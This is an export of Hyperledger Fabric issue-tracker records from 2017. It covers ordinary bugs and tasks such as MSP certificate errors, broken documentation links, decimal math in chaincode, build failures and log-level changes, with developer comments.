2017-06-24 04:25:45.739 UTC [main] main -> ERRO 005 Cannot run peer because error when setting up MSP from directory /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com: err admin 0 is invalid, validation error Could not obtain certification chain, err A CA certificate cannot be used directly by this MSP

Total execution time : 24 secs ...
{code}
 ",,mastersingh24,Ratnakar,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5nj:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,Ratnakar,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Jun/17 7:59 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11119/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
broken links in rtd,FAB-4989,18645,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,ChristopherFerris,ChristopherFerris,24/Jun/17 3:07 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Sep/17 9:54 PM,v1.0.0-rc1,,,Not a Bug,,fabric-docs,,,,,,0,,,,,,,"Getting links from: http://hyperledger-fabric.readthedocs.io/en/latest/dev-setup/devenv.html

├───OK─── https://github.com/hyperledger/fabric/blob/master/docs/source/dev-setup/devenv.rst

├───OK─── https://itunes.apple.com/us/app/xcode/id497799835?mt=12

├───OK─── https://docs.docker.com/compose/

├───OK─── https://pip.pypa.io/en/stable/installing/

├───OK─── https://www.vagrantup.com/

├───OK─── https://www.virtualbox.org/

├───OK─── https://github.com/golang/go/wiki/GOPATH

├───OK─── https://golang.org/doc/install#install

├───OK─── https://github.com/tmatilai/vagrant-proxyconf/

├───OK─── https://github.com/mitchellh/vagrant/issues/6754

├─BROKEN─ http://www.microsoft.com/en-us/download/details.aspx?id=8328 (HTTP_503)

Finished! 129 links found. 118 excluded. 1 broken.

 ",,ChristopherFerris,markparz,yeyc.linuxf,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5nr:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,markparz,yeyc.linuxf,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Jul/17 3:01 AM;markparz;Link seems to work fine for me.... from the page, and the above... can you double check [~ChristopherFerris];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric doesnt provide default-decimal floating package support as part of go-CCENV,FAB-4990,18648,,Task,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,mastersingh24,rhegde,rhegde,24/Jun/17 10:22 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,01/Oct/17 9:11 PM,,,,Abandoned,,fabric-samples,,,,,,0,Release-planning-1.1,,,,,,"As Fabric is supporting financial-service use-case; we were not able to find any go-package in the chaincode environment which does operation on money (or decimal floating point data-type).

Can you please confirm - if this is not available, can this be made available by default to the community? 

Example: 

{quote}
	fmt.Println(""***Float64Play***"")

	var n float64
	for i := 0; i < 3; i++ {
		n += 0.1
	}
	fmt.Println(""sum: float64: "", n)

	a := big.NewFloat(float64(0.1))
	b := big.NewFloat(float64(0.0))
	for i := 0; i < 3; i++ {
		b.Add(b, a)
	}
	fmt.Println(""sum - Big.Float64: "", b)

	var sum decimal.Decimal
	for i := 0; i < 3; i++ {
		sum = sum.Add(decimal.NewFromFloat(0.1))
	}
	fmt.Println(""sum - Decimal: "", sum)
{quote}

{quote}
***Float64Play***
sum: float64:  0.30000000000000004
sum - Big.Float64:  0.30000000000000004
sum - Decimal:  0.3
{quote}


",,mastersingh24,rhegde,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5o7:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,rhegde,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jul/17 6:10 AM;Clayton Sims;CLS is currently using a third party library.   What are the plans from the community given BC is targeting the financial solutions.;;;","20/Jul/17 6:55 PM;mastersingh24;Which library is being used?

Given that within the Fabric runtime we don't actually do processing on any specific types of data (that's left to user chaincode), I don't think we'll provide any external libraries as part of the chaincode package.  

Maybe we should think about some place to store / contribute ""toolkits"" for various industries?;;;","02/Aug/17 1:45 AM;rhegde;we found https://github.com/shopspring/decimal;;;","26/Aug/17 9:40 PM;mastersingh24;Assigned this back to [~rhegde] .

[~rhegde] - if you'd like to submit a sample which uses this package, happy to help. ;;;","29/Sep/17 5:08 AM;rhegde;If this is not going to be supported as default-packaging then please mark this as closed. Usage of the shopspring package in go-application/chaincode can be found @ [https://github.com/shopspring/decimal];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric-samples fabcar/startFabric.sh pulls x86 containers on non-x86 platform,FAB-4991,18649,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,harsha544,harsha544,24/Jun/17 10:23 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,24/Jul/17 2:26 PM,v1.0.0-rc1,,,WON'T FIX,,fabric-samples,,,,,,0,,,,,,,"Observed fabcar examples pulls x86 based containers on non-x86 containers. 
Which eventually results in failure.

I think respective docker-compose.yml can be modified to point to ""latest"" tags",,bsmita,ChristopherFerris,harsha544,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5of:",,,,,,,,,,,,,,,,,,,,,,,bsmita,ChristopherFerris,harsha544,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/17 2:27 AM;muralisr;[~mastersingh24], this got assigned to me but looks like should be [~harsha544] 's as he has a fix in [https://gerrit.hyperledger.org/r/#/c/11123] where you propose it be fixed later.

The fix is consistent with other cases where we use ""latest"" and not ""x86_64-1.0.0-rc1"" tag in the docker compose file. Given we have crossed the rc1 bridge, can we apply the fix now ?;;;","23/Jul/17 9:48 PM;ChristopherFerris;The CR is no longer relevant and should be abandoned, please [~harsha544];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Auction Chaincode daily tests are failing,FAB-4992,18652,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sandp125,rameshthoomu,rameshthoomu,25/Jun/17 2:36 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Jul/17 4:42 AM,v1.0.0-rc1,,,v1.0.0,,fabric-build,,,,,,0,quality,,,,,,"Observed Auction chaincode tests are failing with the recent changes in the ca certpath.. Possibly this patch caused this issue. [https://gerrit.hyperledger.org/r/#/c/11021/]

Below are the build logs:
directory]*21:43:22.327* Error: Error getting broadcast client: Error connecting to orderer.example.com:7050 due to x509: certificate signed by unknown authority
https://jenkins.hyperledger.org/view/Daily/job/fabric-daily-chaincode-tests-x86_64/118/console",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx27b:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Jun/17 10:39 PM;rameshthoomu;patch has been submitted and merged. Will update the status of this issue one the tests are successfully executed in CI;;;","11/Jul/17 4:43 AM;rameshthoomu;tests are executed successfully https://jenkins.hyperledger.org/view/Daily/job/fabric-daily-tests-x86_64/test_results_analyzer/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix formatting for fabcar/*.js,FAB-4994,18657,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,25/Jun/17 6:28 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,25/Jun/17 7:34 AM,v1.0.0-rc1,,,v1.0.0,,fabric-samples,,,,,,0,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5pj:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Jun/17 6:32 AM;mastersingh24;https://gerrit.hyperledger.org/r/11131;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CLI vendors go-unit test files as part chaincode installation,FAB-4995,18658,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,rhegde,rhegde,25/Jun/17 9:28 PM,23/Jan/20 6:52 AM,28/Oct/23 3:00 AM,23/Jan/20 6:52 AM,v1.0.0,,,,,,,,,,,0,stale-item,,,,,,"Fabric Release - 1.0.6

go-unit test case are written and placed in the same folder as the chain-code source folder. CLI installation on fabric-beta-release, packages and vendors these go-unit test files together with chain-code source during the installation process.

Avoiding vendoring of go-unittest file will optimize chain-code installation.

+Steps to Reproduce+:

Use `peer chaincode package` that will vendor chaincode soruce code including unit test case files - copying relevant line
{code:java}
...
2018-07-17 18:48:15.082 UTC [golang-platform] func1 -> DEBU 05b vendoring src/chaincode/clsnetchaincode/clsutil/ClsCommonUtil_test.go -> src/chaincode/clsnetchaincode/public/vendor/chaincode/clsnetchaincode/clsutil/ClsCommonUtil_test.go
...{code}
 

 ",,denyeart,rhegde,sanchezl,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5pr:",,,,,,,,,,,,,,,,,,,,,,,denyeart,rhegde,sanchezl,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Aug/18 11:52 PM;sanchezl;Is this still valid in v1.2?;;;","18/Aug/18 4:48 AM;denyeart;Can't the unit tests be placed in a directory that is not picked up by the chaincode packaging?  That is, test from outside the package as an external consumer rather than test within the package.;;;","23/Jan/20 6:52 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
example04 build fails in the context of behave tests in test/feature,FAB-4998,18662,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Won't Do,shimos,nemoto,nemoto,26/Jun/17 3:51 PM,23/Jan/20 6:52 AM,28/Oct/23 3:00 AM,23/Jan/20 6:52 AM,v1.0.0-rc1,,,Future,,fabric-samples,,,,,,0,stale-item,,,,,,"I'm writing the following scenario in test/feature/peer.feature. But the instantiation of example04 fails.
{noformat}
Scenario Outline: FAB-3866: Multiple Chaincodes Per Peer
  Given I have a bootstrapped fabric network of type <type>
  When a user deploys chaincode at path ""github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example04"" with [""init"", ""test_event"", ""0""] with name ""example04""
  Then the chaincode is deployed
(...snip)
  Examples:
    | type  |
    | solo  |{noformat}
 

I tried to re-run the command and got the following messages.
{noformat}
$ docker exec -it cli bash
root@f735d869a79e:/opt/gopath/src/github.com/hyperledger/fabric/peer# CORE_PEER_MSPCONFIGPATH=/var/hyperledger/configs/740456fe57f111e79d9efa163e2101ee/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp \
CORE_PEER_TLS_ROOTCERT_FILE=/var/hyperledger/configs/740456fe57f111e79d9efa163e2101ee/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt \
CORE_PEER_LOCALMSPID=org1.example.com \
CORE_PEER_ID=peer0.org1.example.com \
CORE_PEER_ADDRESS=peer0.org1.example.com:7051 \
peer chaincode instantiate --name example04 --version 0 --channelID behavesystest --ctor '{""Args"": [""init"", ""test_event"", ""0""]}' --orderer orderer0.example.com:7050
2017-06-23 09:29:06.181 UTC [msp] getMspConfig -> WARN 001 Intermediate certs folder not found at [/var/hyperledger/configs/740456fe57f111e79d9efa163e2101ee/peerOrganizations/org1.e
xample.com/users/Admin@org1.example.com/msp/intermediatecerts]. Skipping. [stat /var/hyperledger/configs/740456fe57f111e79d9efa163e2101ee/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/intermediatecerts: no such file or directory]
2017-06-23 09:29:06.181 UTC [msp] getMspConfig -> WARN 002 TLS intermediate certs folder not found at [/var/hyperledger/configs/740456fe57f111e79d9efa163e2101ee/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/tlsintermediatecerts]. Skipping. [stat /var/hyperledger/configs/740456fe57f111e79d9efa163e2101ee/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/tlsintermediatecerts: no such file or directory]
2017-06-23 09:29:06.182 UTC [msp] getMspConfig -> WARN 003 crls folder not found at [/var/hyperledger/configs/740456fe57f111e79d9efa163e2101ee/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/crls]. Skipping. [stat /var/hyperledger/configs/740456fe57f111e79d9efa163e2101ee/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/crls: no such file or directory]
2017-06-23 09:29:06.219 UTC [msp] GetLocalMSP -> DEBU 004 Returning existing local MSP
2017-06-23 09:29:06.219 UTC [msp] GetDefaultSigningIdentity -> DEBU 005 Obtaining default signing identity
2017-06-23 09:29:06.223 UTC [chaincodeCmd] checkChaincodeCmdParams -> INFO 006 Using default escc
2017-06-23 09:29:06.223 UTC [chaincodeCmd] checkChaincodeCmdParams -> INFO 007 Using default vscc
2017-06-23 09:29:06.225 UTC [msp/identity] Sign -> DEBU 008 Sign: plaintext: 0AA1070A6A08031A0B08E2BEB3CA0510...01300A000A04657363630A0476736363
2017-06-23 09:29:06.225 UTC [msp/identity] Sign -> DEBU 009 Sign: digest: 87A40E1879C2BC151F7DBAF3EDFF09ADB62D1C6BE3E4AFC0200A72B92D802A8C
Error: Error endorsing chaincode: rpc error: code = Unknown desc = Error starting container: Failed to generate platform-specific docker build: Error returned from build: 2 ""# github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example04
/opt/go/pkg/tool/linux_amd64/link: running gcc failed: exit status 1
(...snip)
/tmp/go-link-682861525/000002.o: In function `Verify':
/opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/miekg/pkcs11/pkcs11.go:546: multiple definition of `Verify'
/tmp/go-link-682861525/000001.o:/chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example04/vendor/github.com/hyperledger/fabric/vendor/github.com/miekg/pkcs11/pkcs11.go:546: first defined here
/usr/lib/gcc/x86_64-linux-gnu/5/../../../x86_64-linux-gnu/libltdl.a(dlopen.o): In function `vm_open':
(.text+0x5e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
/tmp/go-link-682861525/000000.o: In function `_cgo_7a2d42f1a351_C2func_getaddrinfo':
/tmp/workdir/go/src/net/cgo_unix.go:66: warning: Using 'getaddrinfo' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
collect2: error: ld returned 1 exit status{noformat}
 

 The environment is as follows:
{noformat}
$ uname -a
Linux test 3.13.0-112-generic #159-Ubuntu SMP Fri Mar 3 15:26:07 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
$ docker version
Client:
Version:      17.03.1-ce
API version:  1.27
Go version:   go1.7.5
Git commit:   c6d412e
Built:        Mon Mar 27 17:10:36 2017
OS/Arch:      linux/amd64

Server:
Version:      17.03.1-ce
API version:  1.27 (minimum version 1.12)
Go version:   go1.7.5
Git commit:   c6d412e
Built:        Mon Mar 27 17:10:36 2017
OS/Arch:      linux/amd64
Experimental: false{noformat}",fabric commit 4e219e9586b241893390f14b6a4d58d500891001,nemoto,scottz,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5qn:",,,,,,,,,,,,,,,,,,,,,,,nemoto,scottz,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Feb/18 11:23 AM;scottz;[~nemoto] Please try doing this inside fabric-test/feature/ , instead of fabric/test/ which is no longer supported. (We have opened a bug o remove it.) There you will also see another test that uses example04 in  the chaincodes.feature file:

'Scenario: -FAB-4703-: -FAB-5663-, Test chaincode calling chaincode - fabric/examples/chaincode_example04
 And a user deploys chaincode at path ""github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example04"" with args [""init"",""Event"",""1""] with name ""myex04""'

 ;;;","23/Jan/20 6:52 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cleanup interface union in chainsupport.go,FAB-4999,18664,,Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,guoger,guoger,guoger,26/Jun/17 6:06 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,18/Jul/17 5:04 AM,,,,,,fabric-orderer,,,,,,0,,,,,,,"`ChainSupport` interface in `chainsupport.go` is an union of `deliver.support`, `broadcast.support` and `ConsenterSupport`. Commit 16e170 introduced `SharedConfig` into `deliver.support`, which conflicts with that in `ConsenterSupport`. This is not supported by Golang due to https://github.com/golang/go/issues/6977.

However, `SharedConfig` was removed in commit 6c28c8, which makes a clean union viable again. Therefore, `ChainSupport` should be cleaned up.",,guoger,jyellick,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5qv:",,,,,,,,,,,,,,,,,,,,,,,guoger,jyellick,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Jun/17 6:15 PM;guoger;https://gerrit.hyperledger.org/r/11141;;;","01/Jul/17 7:35 PM;mastersingh24;[~jyellick] - what do you think?;;;","05/Jul/17 11:19 PM;jyellick;Agreed this is a good change, the old interface definition was definitely a cludgy hack to get around that golang limitation/bug.  If we don't need it, let's remove it.  Holding off the +2 until the v1 cut though.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Reduce getMspConfig log level ,FAB-5000,18666,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,26/Jun/17 8:53 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,27/Jun/17 4:53 AM,v1.0.0-rc1,,,v1.0.0,,fabric-peer,,,,,,1,,,,,,,"When using the MSP (i.e with peer-cli) it prints warnings similar to:

{code}
2017-06-26 07:50:34.073 EDT [msp] getMspConfig -> INFO 001 intermediate certs folder not found at [/home/ibmadmin/deploy/crypto-config/peerOrganizations/hrl.ibm.il/users/Admin@hrl.ibm.il/msp/intermediatecerts]. Skipping.: [stat /home/ibmadmin/deploy/crypto-config/peerOrganizations/hrl.ibm.il/users/Admin@hrl.ibm.il/msp/intermediatecerts: no such file or directory]
2017-06-26 07:50:34.073 EDT [msp] getMspConfig -> INFO 002 crls folder not found at [/home/ibmadmin/deploy/crypto-config/peerOrganizations/hrl.ibm.il/users/Admin@hrl.ibm.il/msp/intermediatecerts]. Skipping.: [stat /home/ibmadmin/deploy/crypto-config/peerOrganizations/hrl.ibm.il/users/Admin@hrl.ibm.il/msp/crls: no such file or directory]
2017-06-26 07:50:34.073 EDT [msp] getMspConfig -> INFO 003 MSP configuration file not found at [/home/ibmadmin/deploy/crypto-config/peerOrganizations/hrl.ibm.il/users/Admin@hrl.ibm.il/msp/config.yaml]: [stat /home/ibmadmin/deploy/crypto-config/peerOrganizations/hrl.ibm.il/users/Admin@hrl.ibm.il/msp/config.yaml: no such file or directory]
peer.tls.rootcert.file: /home/ibmadmin/deploy/crypto-config/peerOrganizations/hrl.ibm.il/peers/peer0.hrl.ibm.il/tls/ca.crt
{code}

(I think now it prints with WARN severity level though)

In my opinion the severity level needs to be DEBUG to make it not show in the peer CLI, and in any case that shouldn't be a warning because that's a viable configuration ",,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5r3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Jun/17 8:56 PM;mastersingh24;[~ChristopherFerris] [~JonathanLevi]  - This is a much needed improvement and is a harmless code change.  The messages are not helpful and actually create more problems then they solve;;;","26/Jun/17 9:37 PM;yacovm;https://gerrit.hyperledger.org/r/#/c/11147/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Uneffective assignment of ""CORE_PEER_MSPCONFIGPATH"" at setGlobals() in file script.sh(e2e_cli)",FAB-5002,18668,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tolak,tolak,tolak,26/Jun/17 10:03 PM,21/Jul/18 3:55 AM,28/Oct/23 3:00 AM,01/Jul/17 7:45 PM,v1.0.0-beta,,,v1.0.0-beta,,fabric-samples,,,,,,0,v1.0,,,,,,"At function setGlobals() in file examples/e2e_cli/scripts/script.sh, the assignment flow of env variable ""CORE_PEER_MSPCONFIGPATH"" is a bit of uneffective. ",,baohua,tolak,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,43200,43200,,0%,43200,43200,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5rj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,tolak,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/17 10:28 AM;baohua;https://gerrit.hyperledger.org/r/11215;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
:ref:_Golang  unresolved reference,FAB-5003,18669,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,Clayton Sims,Clayton Sims,26/Jun/17 10:55 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Jun/17 10:04 PM,,,,v1.0.0-rc1,,fabric-docs,,,,,,0,,,,,,,"h3. In  ""Chaincode for Developers""  section ""Choosing a Location for the Code""  I see "":ref:_Golang"".   

 

I assume this is some type of unresolved reference?

 

 ",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5rr:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Jun/17 1:16 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/11199;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve code coverage for hyperledger/fabric/orderer/configupdate,FAB-5004,18673,16261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,guoger,guoger,27/Jun/17 12:17 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,18/Jul/17 5:06 AM,,,,,,fabric-orderer,,,,,,0,,,,,,,,,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5s7:",,,,,,,,,,,,,,,,,,,,,,,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jun/17 12:20 AM;guoger;https://gerrit.hyperledger.org/r/11151;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Maintain green coloration on RTD hyperlinks,FAB-5005,18674,,Story,Closed,FAB,Fabric,software,denyeart,,,Lowest,Invalid,,nickgaski,nickgaski,27/Jun/17 12:26 AM,21/Jul/18 3:53 AM,28/Oct/23 3:00 AM,20/Jul/18 11:05 PM,,,,,,fabric-docs,,,,,,0,Documentation,help-wanted,,,,,"need to edit the css to keep hyperlinks in the noticeable green shade after they are clicked.

The current implementation grays out these links, making them quite difficult to notice.",,ChristopherFerris,dshuffma,nickgaski,,,,,,,,,,,,,,,,,,,,,,,,,,,,,7200,7200,,0%,7200,7200,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5sf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,dshuffma,nickgaski,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jun/17 12:28 AM;nickgaski;[~dshuffma] - this isn't urgent, but figured you could help very easily here.

https://github.com/hyperledger/fabric/blob/master/docs/source/_static/css/custom.css;;;","27/Jun/17 12:36 AM;dshuffma;I don't have time to make a proper PR but its just this:

change line 49: [https://github.com/hyperledger/fabric/blob/master/docs/source/_static/css/custom.css#L49] to some other color. ex:

 
{code:java}
a:visited {
    color: #B1FF84;
}
{code}
 ;;;","28/Jun/17 11:30 PM;ChristopherFerris;I would STRONGLY advise that you simply leave things be.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
